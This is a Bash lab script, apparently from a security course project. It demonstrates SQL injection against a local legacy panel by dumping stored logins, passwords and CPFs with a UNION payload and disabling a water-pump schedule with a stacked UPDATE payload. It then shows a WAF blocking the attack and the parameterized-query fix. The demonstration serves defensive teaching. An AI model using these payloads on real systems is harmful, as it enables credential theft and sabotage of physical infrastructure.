#!/usr/bin/env bash
# C3 - SQL Injection: captura o ataque no painel legado (ANTES) e a defesa no painel novo (DEPOIS)
# salva tudo em entregaveis/evidencias/C3_sql_injection/
set -uo pipefail
cd "$(dirname "$0")/.."
set -a; . ./.env; set +a
OUT=entregaveis/evidencias/C3_sql_injection
mkdir -p "$OUT"
LEGADO=http://127.0.0.1:8081
PAINEL=https://localhost:8443
JAR=/tmp/c3_jar; rm -f $JAR

echo "== 1. login no painel legado com a credencial roubada no phishing =="
curl -s --noproxy '*' -c $JAR -d "login=coord.voluntarios&senha=Aurora@2026" $LEGADO/ \
  -o /dev/null -w "login no painel legado: HTTP %{http_code}\n" | tee $OUT/01_login_legado.txt

echo
echo "== 2. ANTES: SQL injection UNION rouba usuarios e senhas do banco =="
curl -s --noproxy '*' -b $JAR "$LEGADO/historico" --get \
  --data-urlencode "busca=zzz' UNION SELECT NULL::timestamp, login||':'||senha, cpf, perfil FROM legado.usuarios--" \
  | grep -oE "<td>[^<]*:[^<]*</td>" | sed 's/<[^>]*>//g' | head -15 | tee $OUT/02_dump_credenciais.txt
echo "(credenciais ficticias extraidas pela injecao)"

echo
echo "== 3. agendamento da bomba ANTES do ataque =="
docker exec db psql -U "$POSTGRES_USER" -d "$POSTGRES_DB" -Atc \
  "SELECT espaco,ativo,nivel_liga,alterado_por FROM agendamento_bomba WHERE espaco='escola'" | tee $OUT/03_agenda_antes.txt

echo
echo "== 4. ANTES: a mesma injecao SABOTA a bomba (foi o que esvaziou a caixa no incidente) =="
curl -s --noproxy '*' -b $JAR "$LEGADO/historico" --get \
  --data-urlencode "busca=zzz'; UPDATE agendamento_bomba SET ativo=false, nivel_liga=0, alterado_por='atacante_sqli' WHERE espaco='escola';--" \
  -o /dev/null -w "injecao de UPDATE: HTTP %{http_code}\n"
docker exec db psql -U "$POSTGRES_USER" -d "$POSTGRES_DB" -Atc \
  "SELECT espaco,ativo,nivel_liga,alterado_por FROM agendamento_bomba WHERE espaco='escola'" | tee $OUT/04_agenda_sabotada.txt
echo "(repare: alterado_por = atacante_sqli, ativo = f)"

echo
echo "== 5. DEPOIS: o WAF (ModSecurity) bloqueia a mesma injecao no painel novo =="
curl -sk --noproxy '*' "$PAINEL/acessos?busca=zzz%27%20UNION%20SELECT%20login%20FROM%20legado.usuarios--" \
  -o /dev/null -w "painel novo via WAF: HTTP %{http_code}  (403 = ataque bloqueado)\n" | tee $OUT/05_waf_bloqueia.txt

echo
echo "== 6. a correcao na causa raiz (o que mudou no codigo) =="
{
  echo "### ANTES  nuvem/painel_legado/app.py  (concatena a entrada direto no SQL):"
  grep -n "busca +" nuvem/painel_legado/app.py || grep -n "ILIKE '%" nuvem/painel_legado/app.py
  echo
  echo "### DEPOIS  nuvem/painel/app.py  (consulta parametrizada + validacao de entrada):"
  grep -n "BUSCA_OK = re.compile" nuvem/painel/app.py
  grep -n "ILIKE %s" nuvem/painel/app.py
} | tee $OUT/06_correcao_codigo.txt

echo
echo "== 7. restaurando o agendamento da bomba pro lab voltar ao normal =="
docker exec db psql -U "$POSTGRES_USER" -d "$POSTGRES_DB" -Atc \
  "UPDATE agendamento_bomba SET ativo=true, nivel_liga=40, alterado_por='reset_pos_demo' WHERE espaco='escola'" >/dev/null
echo "ok, bomba normalizada"

echo
echo "================================================================"
echo "evidencias de C3 salvas em $OUT :"
ls -1 "$OUT"
echo "================================================================"
